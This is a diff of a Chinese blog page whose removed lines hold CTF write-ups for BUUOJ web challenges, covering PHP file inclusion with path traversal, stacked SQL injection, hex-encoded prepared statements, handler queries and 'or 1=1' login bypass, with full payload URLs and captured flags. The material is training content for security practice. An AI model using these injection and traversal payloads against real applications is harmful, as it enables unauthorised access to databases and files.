$_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(  <span class="comment">// 截取"?"前的字符串</span></span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;  <span class="comment">// $page in whitelist</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;amp;&amp;amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;amp;&amp;amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=&amp;#92;"</span>https:<span class="comment">//i.loli.net/2018/11/01/5bdb0d93dc794.jpg&amp;#92;" /&gt;";</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>通过 checkFile()  校验则可以包含flag所在文件<br>先访问$whitelist 中的hint.php<br><a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=hint.php" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=hint.php</a><br>获得文件名 <img src="http://localhost:9002/file/image/5f17017f657e1fa600390ac1" alt><br>构造payload：<br><a href="http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg" target="_blank" rel="noopener">http://b0f4656a-28c8-427b-a5ea-d957291f5a7d.node3.buuoj.cn/index.php?file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg</a></p>
-<p>flag ： flag{82c0aedf-43e8-4745-9f2c-38444a3c2f30}</p>
-<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><strong>方法一：堆叠注入，重命名</strong></p>
-<p>SQL语句 ： </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; show databases#</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/23/week20200713-20200719/image-20200726161826216.png" alt="image-20200726161826216"><br>SQL语句 ： </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; show tables#</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/23/week20200713-20200719/image-20200726161841013.png" alt="image-20200726161841013"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/23/week20200713-20200719/image-20200726161859923.png" alt="image-20200726161859923"><br>此处发现了flag字段，以下重点：<br>重命名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0&#39;;</span><br><span class="line">rename table words to words1;</span><br><span class="line">rename table &#96;1919810931114514&#96; to words;</span><br><span class="line">alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br><span class="line">desc  words;#</span><br></pre></td></tr></table></figure>
-<p>再操作取得flag：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
-<p>flag： flag{6804a2d0-bcbf-4f1c-8785-d1f241519712}</p>
-<p><strong>方法二：预处理</strong></p>
-<p>字符串转十六进制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;1919810931114514&#96;</span><br></pre></td></tr></table></figure>
-<p>=&gt; 0x73656c65637420202a2066726f6d20603139313938313039333131313435313460</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">SeT @s2h &#x3D; 0x73656c65637420202a2066726f6d20603139313938313039333131313435313460;</span><br><span class="line">prepare ss from @s2h;</span><br><span class="line">execute ss;</span><br></pre></td></tr></table></figure>
-<p>(SeT 绕过过滤函数）<br>成功获得flag</p>
-<p><strong>方法三：handler查询</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">handler &#96;1919810931114514&#96; open;</span><br><span class="line">handler &#96;1919810931114514&#96; read first;#</span><br></pre></td></tr></table></figure>
-
-<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>原理：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $_GET[&#39;query&#39;] || flag from flag</span><br></pre></td></tr></table></figure>
-<p>非预期解：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>
-<p>预期解：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;</span><br><span class="line">set sql_mode&#x3D;PIPES_AS_CONCAT;</span><br><span class="line">select 1</span><br></pre></td></tr></table></figure>
-<p>解释：mysql缺省不支持oracle将 || 解释为字符串拼接，第二行启用了兼容设置</p>
-<p>flag{13a1a49a-d096-4a5b-aac0-ef90df2f1b2c}</p>
-<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>随便试一下就过了。。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
-<p>URL:<a href="http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271" target="_blank" rel="noopener">http://0f6b6f42-6865-4b45-83d5-e32a7f3ab954.node3.buuoj.cn/check.php?username=admin%27or%271%27=%271&amp;password=admin%27or%271%27=%271</a></p>
-<p>flag{d1d4ffc6-0e42-4ae0-b177-985390fbf756}</p>
-
+          <h1 id="Week-1-lt-2020-07-13-2020-07-19-gt"><a href="#Week-1-lt-2020-07-13-2020-07-19-gt" class="headerlink" title="Week 1 &lt;2020.07.13 - 2020.07.19&gt;"></a>Week 1 &lt;2020.07.13 - 2020.07.19&gt;</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/07/23/week20200713-20200719/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
